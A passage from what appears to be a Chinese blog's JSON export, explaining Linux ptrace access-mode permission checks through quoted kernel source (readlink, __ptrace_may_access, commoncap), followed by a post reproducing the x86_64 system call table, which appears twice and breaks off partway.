PTRACE_MODE_REALCREDS，因此在下一步的检查中使用调用者的real UID 和 GID。 (3) 如果以下条件都不满足，则拒绝访问： 目标的真实、有效和保存的用户ID与调用者的用户ID相匹配，并且目标的真实、有效和保存的组ID与调用者的组ID相匹配。 调用者在目标的用户命名空间中具有 CAP_SYS_PTRACE 能力。 (4) 如果目标进程的“可转储”属性的值不等于1（SUID_DUMP_USER；参见 prctl(2) 中关于 PR_SET_DUMPABLE 的讨论），并且调用者在目标进程的用户命名空间中没有 CAP_SYS_PTRACE 能力，则拒绝访问。 (5) 调用内核的LSM security_ptrace_access_check() 接口来检查是否允许ptrace访问。实现这一接口的commoncap LSM执行以下步骤： 如果访问模式包括 PTRACE_MODE_FSCREDS，则在以下检查中使用调用者的 有效 能力集；否则（访问模式指定 PTRACE_MODE_REALCREDS），使用调用者的 允许 能力集。 如果以下条件都不满足，则拒绝访问： 调用者和目标进程在同一用户命名空间中，且调用者的capabilities是目标进程 permitted 的超集。 调用者在目标进程的用户命名空间中具有 CAP_SYS_PTRACE 能力。 注意，commoncap LSM不区分 PTRACE_MODE_READ 和 PTRACE_MODE_ATTACH。 (6) 如果在前面的步骤中没有被拒绝访问，那么允许访问。 以&#x2F;proc&#x2F;pid&#x2F;exe为例，此文件是包含已执行命令的实际路径名的符号链接。 取消引用或读取的权限 （readlink（2）） 这个符号链接由 ptrace 访问模式 PTRACE_MODE_READ_FSCREDS控制 源码分析以使用readlink系统调用访问&#x2F;proc&#x2F;pid&#x2F;exe的源码为例。 sys_readlinkstat.c - fs&#x2F;stat.c - Linux source code (v6.6.6) - Bootlin 1234567891011SYSCALL_DEFINE4(readlinkat, int, dfd, const char __user *, pathname, char __user *, buf, int, bufsiz)&#123; return do_readlinkat(dfd, pathname, buf, bufsiz);&#125;SYSCALL_DEFINE3(readlink, const char __user *, path, char __user *, buf, int, bufsiz)&#123; return do_readlinkat(AT_FDCWD, path, buf, bufsiz);&#125; do_readlinkatdo_readlinkat identifier - Linux source code (v6.6.6) - Bootlin 1234567891011121314151617181920212223242526272829303132333435static int do_readlinkat(int dfd, const char __user *pathname, char __user *buf, int bufsiz)&#123; struct path path; int error; int empty = 0; unsigned int lookup_flags = LOOKUP_EMPTY; if (bufsiz &lt;= 0) return -EINVAL;retry: error = user_path_at_empty(dfd, pathname, lookup_flags, &amp;path, &amp;empty); if (!error) &#123; struct inode *inode = d_backing_inode(path.dentry); error = empty ? -ENOENT : -EINVAL; /* * AFS mountpoints allow readlink(2) but are not symlinks */ if (d_is_symlink(path.dentry) || inode-&gt;i_op-&gt;readlink) &#123; error = security_inode_readlink(path.dentry); if (!error) &#123; touch_atime(&amp;path); error = vfs_readlink(path.dentry, buf, bufsiz); &#125; &#125; path_put(&amp;path); if (retry_estale(error, lookup_flags)) &#123; lookup_flags |= LOOKUP_REVAL; goto retry; &#125; &#125; return error;&#125; vfs_readlinknamei.c - fs&#x2F;namei.c - Linux source code (v6.6.6) - Bootlin 12345678910111213141516171819202122232425262728293031323334353637383940/** * vfs_readlink - copy symlink body into userspace buffer * @dentry: dentry on which to get symbolic link * @buffer: user memory pointer * @buflen: size of buffer * * Does not touch atime. That&#x27;s up to the caller if necessary * * Does not call security hook. */int vfs_readlink(struct dentry *dentry, char __user *buffer, int buflen)&#123; struct inode *inode = d_inode(dentry); DEFINE_DELAYED_CALL(done); const char *link; int res; if (unlikely(!(inode-&gt;i_opflags &amp; IOP_DEFAULT_READLINK))) &#123; if (unlikely(inode-&gt;i_op-&gt;readlink)) return inode-&gt;i_op-&gt;readlink(dentry, buffer, buflen); if (!d_is_symlink(dentry)) return -EINVAL; spin_lock(&amp;inode-&gt;i_lock); inode-&gt;i_opflags |= IOP_DEFAULT_READLINK; spin_unlock(&amp;inode-&gt;i_lock); &#125; link = READ_ONCE(inode-&gt;i_link); if (!link) &#123; link = inode-&gt;i_op-&gt;get_link(dentry, inode, &amp;done); if (IS_ERR(link)) return PTR_ERR(link); &#125; res = readlink_copy(buffer, buflen, link); do_delayed_call(&amp;done); return res;&#125;EXPORT_SYMBOL(vfs_readlink); proc_pid_get_linkbase.c - fs&#x2F;proc&#x2F;base.c - Linux source code (v6.6.6) - Bootlin 12345678910111213141516171819202122static const char *proc_pid_get_link(struct dentry *dentry, struct inode *inode, struct delayed_call *done)&#123; struct path path; int error = -EACCES; if (!dentry) return ERR_PTR(-ECHILD); /* Are we allowed to snoop on the tasks file descriptors? */ if (!proc_fd_access_allowed(inode)) goto out; error = PROC_I(inode)-&gt;op.proc_get_link(dentry, &amp;path); if (error) goto out; error = nd_jump_link(&amp;path);out: return ERR_PTR(error);&#125; proc_fd_access_allowedbase.c - fs&#x2F;proc&#x2F;base.c - Linux source code (v6.6.6) - Bootlin 12345678910111213141516/* permission checks */static bool proc_fd_access_allowed(struct inode *inode)&#123; struct task_struct *task; bool allowed = false; /* Allow access to a task&#x27;s file descriptors if it is us or we * may use ptrace attach to the process and find out that * information. */ task = get_proc_task(inode); if (task) &#123; allowed = ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS); put_task_struct(task); &#125; return allowed;&#125; ptrace_may_accessptrace.c - kernel&#x2F;ptrace.c - Linux source code (v6.6.6) - Bootlin 12345678bool ptrace_may_access(struct task_struct *task, unsigned int mode)&#123; int err; task_lock(task); err = __ptrace_may_access(task, mode); task_unlock(task); return !err;&#125; __ptrace_may_accessptrace.c - kernel&#x2F;ptrace.c - Linux source code (v6.6.6) - Bootlin 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273/* Returns 0 on success, -errno on denial. */static int __ptrace_may_access(struct task_struct *task, unsigned int mode)&#123; const struct cred *cred = current_cred(), *tcred; struct mm_struct *mm; kuid_t caller_uid; kgid_t caller_gid; if (!(mode &amp; PTRACE_MODE_FSCREDS) == !(mode &amp; PTRACE_MODE_REALCREDS)) &#123; WARN(1, &quot;denying ptrace access check without PTRACE_MODE_*CREDS\\n&quot;); return -EPERM; &#125; /* May we inspect the given task? * This check is used both for attaching with ptrace * and for allowing access to sensitive information in /proc. * * ptrace_attach denies several cases that /proc allows * because setting up the necessary parent/child relationship * or halting the specified task is impossible. */ /* Don&#x27;t let security modules deny introspection */ if (same_thread_group(task, current)) return 0; rcu_read_lock(); if (mode &amp; PTRACE_MODE_FSCREDS) &#123; caller_uid = cred-&gt;fsuid; caller_gid = cred-&gt;fsgid; &#125; else &#123; /* * Using the euid would make more sense here, but something * in userland might rely on the old behavior, and this * shouldn&#x27;t be a security problem since * PTRACE_MODE_REALCREDS implies that the caller explicitly * used a syscall that requests access to another process * (and not a filesystem syscall to procfs). */ caller_uid = cred-&gt;uid; caller_gid = cred-&gt;gid; &#125; tcred = __task_cred(task); if (uid_eq(caller_uid, tcred-&gt;euid) &amp;&amp; uid_eq(caller_uid, tcred-&gt;suid) &amp;&amp; uid_eq(caller_uid, tcred-&gt;uid) &amp;&amp; gid_eq(caller_gid, tcred-&gt;egid) &amp;&amp; gid_eq(caller_gid, tcred-&gt;sgid) &amp;&amp; gid_eq(caller_gid, tcred-&gt;gid)) goto ok; if (ptrace_has_cap(tcred-&gt;user_ns, mode)) goto ok; rcu_read_unlock(); return -EPERM;ok: rcu_read_unlock(); /* * If a task drops privileges and becomes nondumpable (through a syscall * like setresuid()) while we are trying to access it, we must ensure * that the dumpability is read after the credentials; otherwise, * we may be able to attach to a task that we shouldn&#x27;t be able to * attach to (as if the task had dropped privileges without becoming * nondumpable). * Pairs with a write barrier in commit_creds(). */ smp_rmb(); mm = task-&gt;mm; if (mm &amp;&amp; ((get_dumpable(mm) != SUID_DUMP_USER) &amp;&amp; !ptrace_has_cap(mm-&gt;user_ns, mode))) return -EPERM; return security_ptrace_access_check(task, mode);&#125; 判断当前进程和目标进程是否处于同一线程组 12if (same_thread_group(task, current)) return 0; 如果属于同一线程组，有权限访问。 如果不在同一线程组，判断当前进程的fsuid和fsgid是否和目标进程的real_cred的euid，suid，uid和egid，sgid，gid相等，如果不一样则调用ptrace_has_cap() 函数检查调用进程在目标进程的 user namespace 中是否拥有 CAP_SYS_PTRACE 权限，如果没有的话拒绝访问。 ptrace_has_capptrace.c - kernel&#x2F;ptrace.c - Linux source code (v6.6.6) - Bootlin 123456static bool ptrace_has_cap(struct user_namespace *ns, unsigned int mode)&#123; if (mode &amp; PTRACE_MODE_NOAUDIT) return ns_capable_noaudit(ns, CAP_SYS_PTRACE); return ns_capable(ns, CAP_SYS_PTRACE);&#125; security_ptrace_access_checksecurity.h - include&#x2F;linux&#x2F;security.h - Linux source code (v6.6.6) - Bootlin 12345static inline int security_ptrace_access_check(struct task_struct *child, unsigned int mode)&#123; return cap_ptrace_access_check(child, mode);&#125; cap_ptrace_access_checkcommoncap.c - security&#x2F;commoncap.c - Linux source code (v6.6.6) - Bootlin 1234567891011121314151617181920212223242526272829303132333435363738/** * cap_ptrace_access_check - Determine whether the current process may access * another * @child: The process to be accessed * @mode: The mode of attachment. * * If we are in the same or an ancestor user_ns and have all the target * task&#x27;s capabilities, then ptrace access is allowed. * If we have the ptrace capability to the target user_ns, then ptrace * access is allowed. * Else denied. * * Determine whether a process may access another, returning 0 if permission * granted, -ve if denied. */int cap_ptrace_access_check(struct task_struct *child, unsigned int mode)&#123; int ret = 0; const struct cred *cred, *child_cred; const kernel_cap_t *caller_caps; rcu_read_lock(); cred = current_cred(); child_cred = __task_cred(child); if (mode &amp; PTRACE_MODE_FSCREDS) caller_caps = &amp;cred-&gt;cap_effective; else caller_caps = &amp;cred-&gt;cap_permitted; if (cred-&gt;user_ns == child_cred-&gt;user_ns &amp;&amp; cap_issubset(child_cred-&gt;cap_permitted, *caller_caps)) goto out; if (ns_capable(child_cred-&gt;user_ns, CAP_SYS_PTRACE)) goto out; ret = -EPERM;out: rcu_read_unlock(); return ret;&#125; 当前进程和目标进程在同一个user namespace下且当前进程的cap_effective是目标进程的cap_permitted的超集，则有权限访问。如果上述判断失败。 则判断当前进程在目标进程的user ns中是否具有CAP_SYS_PTRACE权限。 总结 如果调用进程和目标进程属于同一个线程组，则允许访问。 如果访问模式中指定了 PTRACE_MODE_FSCREDS 标志位，那么在接下来的文件系统权限检查中将使用调用进程的 filesystem UID（fsuid）和 filesystem GID（fsgid）。如果访问模式中指定了 PTRACE_MODE_REALCREDS 标志位，那么在接下来的文件系统权限检查中将使用调用进程的 real UID（uid）和 real GID（gid）。 如果不能满足以下任意一个条件，那么拒绝访问： 调用进程的 fsuid、fsgid 分别与目标进程的 euid、suid、uid、egid、sgid、gid 匹配。 调用进程在目标进程的 user namespace 中拥有 CAP_SYS_PTRACE 能力。 如果目标进程被设置为 nondumpable，且调用进程在目标进程的 user namespace 中没有 CAP_SYS_PTRACE 能力，那么拒绝访问。 如果不能满足以下任意一个条件，那么内核的 commoncap LSM 模块会拒绝访问： 调用进程和目标进程属于同一个 user namespace，且调用进程的能力集是目标进程的许可能力集的超集。 调用进程在目标进程所在的 user namespace 中拥有 CAP_SYS_PTRACE 能力。","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"权限","slug":"Linux内核/权限","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/%E6%9D%83%E9%99%90/"}],"tags":[]},{"title":"Linux系统调用表","slug":"Linux系统调用表及全部系统调用分析","date":"2023-12-12T03:28:39.000Z","updated":"2023-12-15T06:59:35.315Z","comments":true,"path":"2023/12/12/Linux系统调用表及全部系统调用分析/","link":"","permalink":"http://example.com/2023/12/12/Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8%E5%8F%8A%E5%85%A8%E9%83%A8%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90/","excerpt":"linux&#x2F;arch&#x2F;x86&#x2F;entry&#x2F;syscalls&#x2F;syscall_64.tbl at master · torvalds&#x2F;linux (github.com) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425## 64-bit system call numbers and entry vectors## The format is:# &lt;number&gt; &lt;abi&gt; &lt;name&gt; &lt;entry point&gt;## The __x64_sys_*() stubs are created on-the-fly for sys_*() system calls## The abi is &quot;common&quot;, &quot;64&quot; or &quot;x32&quot; for this file.#0 common read sys_read1 common write sys_write2 common open sys_open3 common close sys_close4 common stat sys_newstat5 common fstat sys_newfstat6 common lstat sys_newlstat7 common poll sys_poll8 common lseek sys_lseek9 common mmap sys_mmap10 common mprotect sys_mprotect11 common munmap sys_munmap12 common brk sys_brk13 64 rt_sigaction sys_rt_sigaction14 common rt_sigprocmask sys_rt_sigprocmask15 64 rt_sigreturn sys_rt_sigreturn16 64 ioctl sys_ioctl17 common pread64 sys_pread6418 common pwrite64 sys_pwrite6419 64 readv sys_readv20 64 writev sys_writev21 common access sys_access22 common pipe sys_pipe23 common select sys_select24 common sched_yield sys_sched_yield25 common mremap sys_mremap26 common msync sys_msync27 common mincore sys_mincore28 common madvise sys_madvise29 common shmget sys_shmget30 common shmat sys_shmat31 common shmctl sys_shmctl32 common dup sys_dup33 common dup2 sys_dup234 common pause sys_pause35 common nanosleep sys_nanosleep36 common getitimer sys_getitimer37 common alarm sys_alarm38 common setitimer sys_setitimer39 common getpid sys_getpid40 common sendfile sys_sendfile6441 common socket sys_socket42 common connect sys_connect43 common accept sys_accept44 common sendto sys_sendto45 64 recvfrom sys_recvfrom46 64 sendmsg sys_sendmsg47 64 recvmsg sys_recvmsg48 common shutdown sys_shutdown49 common bind sys_bind50 common listen sys_listen51 common getsockname sys_getsockname52 common getpeername sys_getpeername53 common socketpair sys_socketpair54 64 setsockopt sys_setsockopt55 64 getsockopt sys_getsockopt56 common clone sys_clone57 common fork sys_fork58 common vfork sys_vfork59 64 execve sys_execve60 common exit sys_exit61 common wait4 sys_wait462 common kill sys_kill63 common uname sys_newuname64 common semget sys_semget65 common semop sys_semop66 common semctl sys_semctl67 common shmdt sys_shmdt68 common msgget sys_msgget69 common msgsnd sys_msgsnd70 common msgrcv sys_msgrcv71 common msgctl sys_msgctl72 common fcntl sys_fcntl73 common flock sys_flock74 common fsync sys_fsync75 common fdatasync sys_fdatasync76 common truncate sys_truncate77 common ftruncate sys_ftruncate78 common getdents sys_getdents79 common getcwd sys_getcwd80 common chdir sys_chdir81 common fchdir sys_fchdir82 common rename sys_rename83 common mkdir sys_mkdir84 common rmdir sys_rmdir85 common creat sys_creat86 common link sys_link87 common unlink sys_unlink88 common symlink sys_symlink89 common readlink sys_readlink90 common chmod sys_chmod91 common fchmod sys_fchmod92 common chown sys_chown93 common fchown sys_fchown94 common lchown sys_lchown95 common umask sys_umask96 common gettimeofday sys_gettimeofday97 common getrlimit sys_getrlimit98 common getrusage sys_getrusage99 common sysinfo sys_sysinfo100 common times sys_times101 64 ptrace sys_ptrace102 common getuid sys_getuid103 common syslog sys_syslog104 common getgid sys_getgid105 common setuid sys_setuid106 common setgid sys_setgid107 common geteuid sys_geteuid108 common getegid sys_getegid109 common setpgid sys_setpgid110 common getppid sys_getppid111 common getpgrp sys_getpgrp112 common setsid sys_setsid113 common setreuid sys_setreuid114 common setregid sys_setregid115 common getgroups sys_getgroups116 common setgroups sys_setgroups117 common setresuid sys_setresuid118 common getresuid sys_getresuid119 common setresgid sys_setresgid120 common getresgid sys_getresgid121 common getpgid sys_getpgid122 common setfsuid sys_setfsuid123 common setfsgid sys_setfsgid124 common getsid sys_getsid125 common capget sys_capget126 common capset sys_capset127 64 rt_sigpending sys_rt_sigpending128 64 rt_sigtimedwait sys_rt_sigtimedwait129 64 rt_sigqueueinfo sys_rt_sigqueueinfo130 common rt_sigsuspend sys_rt_sigsuspend131 64 sigaltstack sys_sigaltstack132 common utime sys_utime133 common mknod sys_mknod134 64 uselib135 common personality sys_personality136 common ustat sys_ustat137 common statfs sys_statfs138 common fstatfs sys_fstatfs139 common sysfs sys_sysfs140 common getpriority sys_getpriority141 common setpriority sys_setpriority142 common sched_setparam sys_sched_setparam143 common sched_getparam sys_sched_getparam144 common sched_setscheduler sys_sched_setscheduler145 common sched_getscheduler sys_sched_getscheduler146 common sched_get_priority_max sys_sched_get_priority_max147 common sched_get_priority_min sys_sched_get_priority_min148 common sched_rr_get_interval sys_sched_rr_get_interval149 common mlock sys_mlock150 common munlock sys_munlock151 common mlockall sys_mlockall152 common munlockall sys_munlockall153 common vhangup sys_vhangup154 common modify_ldt sys_modify_ldt155 common pivot_root sys_pivot_root156 64 _sysctl sys_ni_syscall157 common prctl sys_prctl158 common arch_prctl sys_arch_prctl159 common adjtimex sys_adjtimex160 common setrlimit sys_setrlimit161 common chroot sys_chroot162 common sync sys_sync163 common acct sys_acct164 common settimeofday sys_settimeofday165 common mount sys_mount166 common umount2 sys_umount167 common swapon sys_swapon168 common swapoff sys_swapoff169 common reboot sys_reboot170 common sethostname sys_sethostname171 common setdomainname sys_setdomainname172 common iopl sys_iopl173 common ioperm sys_ioperm174 64 create_module175 common init_module sys_init_module176 common delete_module sys_delete_module177 64 get_kernel_syms178 64 query_module179 common quotactl sys_quotactl180 64 nfsservctl181 common getpmsg182 common putpmsg183 common afs_syscall184 common tuxcall185 common security186 common gettid sys_gettid187 common readahead sys_readahead188 common setxattr sys_setxattr189 common lsetxattr sys_lsetxattr190 common fsetxattr sys_fsetxattr191 common getxattr sys_getxattr192 common lgetxattr sys_lgetxattr193 common fgetxattr sys_fgetxattr194 common listxattr sys_listxattr195 common llistxattr sys_llistxattr196 common flistxattr sys_flistxattr197 common removexattr sys_removexattr198 common lremovexattr sys_lremovexattr199 common fremovexattr sys_fremovexattr200 common tkill sys_tkill201 common time sys_time202 common futex sys_futex203 common sched_setaffinity sys_sched_setaffinity204 common sched_getaffinity sys_sched_getaffinity205 64 set_thread_area206 64 io_setup sys_io_setup207 common io_destroy sys_io_destroy208 common io_getevents sys_io_getevents209 64 io_submit sys_io_submit210 common io_cancel sys_io_cancel211 64 get_thread_area212 common lookup_dcookie213 common epoll_create sys_epoll_create214 64 epoll_ctl_old215 64 epoll_wait_old216 common remap_file_pages sys_remap_file_pages217 common getdents64 sys_getdents64218 common set_tid_address sys_set_tid_address219 common restart_syscall sys_restart_syscall220 common semtimedop sys_semtimedop221 common fadvise64 sys_fadvise64222 64 timer_create sys_timer_create223 common timer_settime sys_timer_settime224 common timer_gettime sys_timer_gettime225 common timer_getoverrun sys_timer_getoverrun226 common timer_delete sys_timer_delete227 common clock_settime sys_clock_settime228 common clock_gettime sys_clock_gettime229 common clock_getres sys_clock_getres230 common clock_nanosleep sys_clock_nanosleep231 common exit_group sys_exit_group232 common epoll_wait sys_epoll_wait233 common epoll_ctl sys_epoll_ctl234 common tgkill sys_tgkill235 common utimes sys_utimes236 64 vserver237 common mbind sys_mbind238 common set_mempolicy sys_set_mempolicy239 common get_mempolicy sys_get_mempolicy240 common mq_open sys_mq_open241 common mq_unlink sys_mq_unlink242 common mq_timedsend sys_mq_timedsend243 common mq_timedreceive sys_mq_timedreceive244 64 mq_notify sys_mq_notify245 common mq_getsetattr sys_mq_getsetattr246 64 kexec_load sys_kexec_load247 64 waitid sys_waitid248 common add_key sys_add_key249 common request_key sys_request_key250 common keyctl sys_keyctl251 common ioprio_set sys_ioprio_set252 common ioprio_get sys_ioprio_get253 common inotify_init sys_inotify_init254 common inotify_add_watch sys_inotify_add_watch255 common inotify_rm_watch sys_inotify_rm_watch256 common migrate_pages sys_migrate_pages257 common openat sys_openat258 common mkdirat sys_mkdirat259 common mknodat sys_mknodat260 common fchownat sys_fchownat261 common futimesat sys_futimesat262 common newfstatat sys_newfstatat263 common unlinkat sys_unlinkat264 common renameat sys_renameat265 common linkat sys_linkat266 common symlinkat sys_symlinkat267 common readlinkat sys_readlinkat268 common fchmodat sys_fchmodat269 common faccessat sys_faccessat270 common pselect6 sys_pselect6271 common ppoll sys_ppoll272 common unshare sys_unshare273 64 set_robust_list sys_set_robust_list274 64 get_robust_list sys_get_robust_list275 common splice sys_splice276 common tee sys_tee277 common sync_file_range sys_sync_file_range278 64 vmsplice sys_vmsplice279 64 move_pages sys_move_pages280 common utimensat sys_utimensat281 common epoll_pwait sys_epoll_pwait282 common signalfd sys_signalfd283 common timerfd_create sys_timerfd_create284 common eventfd sys_eventfd285 common fallocate sys_fallocate286 common timerfd_settime sys_timerfd_settime287 common timerfd_gettime sys_timerfd_gettime288 common accept4 sys_accept4289 common signalfd4 sys_signalfd4290 common eventfd2 sys_eventfd2291 common epoll_create1 sys_epoll_create1292 common dup3 sys_dup3293 common pipe2 sys_pipe2294 common inotify_init1 sys_inotify_init1295 64 preadv sys_preadv296 64 pwritev sys_pwritev297 64 rt_tgsigqueueinfo sys_rt_tgsigqueueinfo298 common perf_event_open sys_perf_event_open299 64 recvmmsg sys_recvmmsg300 common fanotify_init sys_fanotify_init301 common fanotify_mark sys_fanotify_mark302 common prlimit64 sys_prlimit64303 common name_to_handle_at sys_name_to_handle_at304 common open_by_handle_at sys_open_by_handle_at305 common clock_adjtime sys_clock_adjtime306 common syncfs sys_syncfs307 64 sendmmsg sys_sendmmsg308 common setns sys_setns309 common getcpu sys_getcpu310 64 process_vm_readv sys_process_vm_readv311 64 process_vm_writev sys_process_vm_writev312 common kcmp sys_kcmp313 common finit_module sys_finit_module314 common sched_setattr sys_sched_setattr315 common sched_getattr sys_sched_getattr316 common renameat2 sys_renameat2317 common seccomp sys_seccomp318 common getrandom sys_getrandom319 common memfd_create sys_memfd_create320 common kexec_file_load sys_kexec_file_load321 common bpf sys_bpf322 64 execveat sys_execveat323 common userfaultfd sys_userfaultfd324 common membarrier sys_membarrier325 common mlock2 sys_mlock2326 common copy_file_range sys_copy_file_range327 64 preadv2 sys_preadv2328 64 pwritev2 sys_pwritev2329 common pkey_mprotect sys_pkey_mprotect330 common pkey_alloc sys_pkey_alloc331 common pkey_free sys_pkey_free332 common statx sys_statx333 common io_pgetevents sys_io_pgetevents334 common rseq sys_rseq# don&#x27;t use numbers 387 through 423, add new calls after the last# &#x27;common&#x27; entry424 common pidfd_send_signal sys_pidfd_send_signal425 common io_uring_setup sys_io_uring_setup426 common io_uring_enter sys_io_uring_enter427 common io_uring_register sys_io_uring_register428 common open_tree sys_open_tree429 common move_mount sys_move_mount430 common fsopen sys_fsopen431 common fsconfig sys_fsconfig432 common fsmount sys_fsmount433 common fspick sys_fspick434 common pidfd_open sys_pidfd_open435 common clone3 sys_clone3436 common close_range sys_close_range437 common openat2 sys_openat2438 common pidfd_getfd sys_pidfd_getfd439 common faccessat2 sys_faccessat2440 common process_madvise sys_process_madvise441 common epoll_pwait2 sys_epoll_pwait2442 common mount_setattr sys_mount_setattr443 common quotactl_fd sys_quotactl_fd444 common landlock_create_ruleset sys_landlock_create_ruleset445 common landlock_add_rule sys_landlock_add_rule446 common landlock_restrict_self sys_landlock_restrict_self447 common memfd_secret sys_memfd_secret448 common process_mrelease sys_process_mrelease449 common futex_waitv sys_futex_waitv450 common set_mempolicy_home_node sys_set_mempolicy_home_node451 common cachestat sys_cachestat452 common fchmodat2 sys_fchmodat2453 64 map_shadow_stack sys_map_shadow_stack454 common futex_wake sys_futex_wake455 common futex_wait sys_futex_wait456 common futex_requeue sys_futex_requeue## Due to a historical design error, certain syscalls are numbered differently# in x32 as compared to native x86_64. These syscalls have numbers 512-547.# Do not add new syscalls to this range. Numbers 548 and above are available# for non-x32 use.#512 x32 rt_sigaction compat_sys_rt_sigaction513 x32 rt_sigreturn compat_sys_x32_rt_sigreturn514 x32 ioctl compat_sys_ioctl515 x32 readv sys_readv516 x32 writev sys_writev517 x32 recvfrom compat_sys_recvfrom518 x32 sendmsg compat_sys_sendmsg519 x32 recvmsg compat_sys_recvmsg520 x32 execve compat_sys_execve521 x32 ptrace compat_sys_ptrace522 x32 rt_sigpending compat_sys_rt_sigpending523 x32 rt_sigtimedwait compat_sys_rt_sigtimedwait_time64524 x32 rt_sigqueueinfo compat_sys_rt_sigqueueinfo525 x32 sigaltstack compat_sys_sigaltstack526 x32 timer_create compat_sys_timer_create527 x32 mq_notify compat_sys_mq_notify528 x32 kexec_load compat_sys_kexec_load529 x32 waitid compat_sys_waitid530 x32 set_robust_list compat_sys_set_robust_list531 x32 get_robust_list compat_sys_get_robust_list532 x32 vmsplice sys_vmsplice533 x32 move_pages sys_move_pages534 x32 preadv compat_sys_preadv64535 x32 pwritev compat_sys_pwritev64536 x32 rt_tgsigqueueinfo compat_sys_rt_tgsigqueueinfo537 x32 recvmmsg compat_sys_recvmmsg_time64538 x32 sendmmsg compat_sys_sendmmsg539 x32 process_vm_readv sys_process_vm_readv540 x32 process_vm_writev sys_process_vm_writev541 x32 setsockopt sys_setsockopt542 x32 getsockopt sys_getsockopt543 x32 io_setup compat_sys_io_setup544 x32 io_submit compat_sys_io_submit545 x32 execveat compat_sys_execveat546 x32 preadv2 compat_sys_preadv64v2547 x32 pwritev2 compat_sys_pwritev64v2# This is the end of the legacy x32 range. Numbers 548 and above are# not special and are not to be used for x32-specific syscalls. read&#x2F;sys_read","text":"linux&#x2F;arch&#x2F;x86&#x2F;entry&#x2F;syscalls&#x2F;syscall_64.tbl at master · torvalds&#x2F;linux (github.com) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425## 64-bit system call numbers and entry vectors## The format is:# &lt;number&gt; &lt;abi&gt; &lt;name&gt; &lt;entry point&gt;## The __x64_sys_*() stubs are created on-the-fly for sys_*() system calls## The abi is &quot;common&quot;, &quot;64&quot; or &quot;x32&quot; for this file.#0 common read sys_read1 common write sys_write2 common open sys_open3 common close sys_close4 common stat sys_newstat5 common fstat sys_newfstat6 common lstat sys_newlstat7 common poll sys_poll8 common lseek sys_lseek9 common mmap sys_mmap10 common mprotect sys_mprotect11 common munmap sys_munmap12 common brk sys_brk13 64 rt_sigaction sys_rt_sigaction14 common rt_sigprocmask sys_rt_sigprocmask15 64 rt_sigreturn sys_rt_sigreturn16 64 ioctl sys_ioctl17 common pread64 sys_pread6418 common pwrite64 sys_pwrite6419 64 readv sys_readv20 64 writev sys_writev21 common access sys_access22 common pipe sys_pipe23 common select sys_select24 common sched_yield sys_sched_yield25 common mremap sys_mremap26 common msync sys_msync27 common mincore sys_mincore28 common madvise sys_madvise29 common shmget sys_shmget30 common shmat sys_shmat31 common shmctl sys_shmctl32 common dup sys_dup33 common dup2 sys_dup234 common pause sys_pause35 common nanosleep sys_nanosleep36 common getitimer sys_getitimer37 common alarm sys_alarm38 common setitimer sys_setitimer39 common getpid sys_getpid40 common sendfile sys_sendfile6441 common socket sys_socket42 common connect sys_connect43 common accept sys_accept44 common sendto sys_sendto45 64 recvfrom sys_recvfrom46 64 sendmsg sys_sendmsg47 64 recvmsg sys_recvmsg48 common shutdown sys_shutdown49 common bind sys_bind50 common listen sys_listen51 common getsockname sys_getsockname52 common getpeername sys_getpeername53 common socketpair sys_socketpair54 64 setsockopt sys_setsockopt55 64 getsockopt sys_getsockopt56 common clone sys_clone57 common fork sys_fork58 common vfork sys_vfork59 64 execve sys_execve60 common exit sys_exit61 common wait4 sys_wait462 common kill sys_kill63 common uname sys_newuname64 common semget sys_semget65 common semop sys_semop66 common semctl sys_semctl67 common shmdt sys_shmdt68 common msgget sys_msgget69 common msgsnd sys_msgsnd70 common msgrcv sys_msgrcv71 common msgctl sys_msgctl72 common fcntl sys_fcntl73 common flock sys_flock74 common fsync sys_fsync75 common fdatasync sys_fdatasync76 common truncate sys_truncate77 common ftruncate sys_ftruncate78 common getdents sys_getdents79 common getcwd sys_getcwd80 common chdir sys_chdir81 common fchdir sys_fchdir82 common rename sys_rename83 common mkdir sys_mkdir84 common rmdir sys_rmdir85 common creat sys_creat86 common link sys_link87 common unlink sys_unlink88 common symlink sys_symlink89 common readlink sys_readlink90 common chmod sys_chmod91 common fchmod sys_fchmod92 common chown sys_chown93 common fchown sys_fchown94 common lchown sys_lchown95 common umask sys_umask96 common gettimeofday sys_gettimeofday97 common getrlimit sys_getrlimit98 common getrusage sys_getrusage99 common sysinfo sys_sysinfo100 common times sys_times101 64 ptrace sys_ptrace102 common getuid sys_getuid103 common syslog sys_syslog104 common getgid sys_getgid105 common setuid sys_setuid106 common setgid sys_setgid107 common geteuid sys_geteuid108 common getegid sys_getegid109 common setpgid sys_setpgid110 common getppid sys_getppid111 common getpgrp sys_getpgrp112 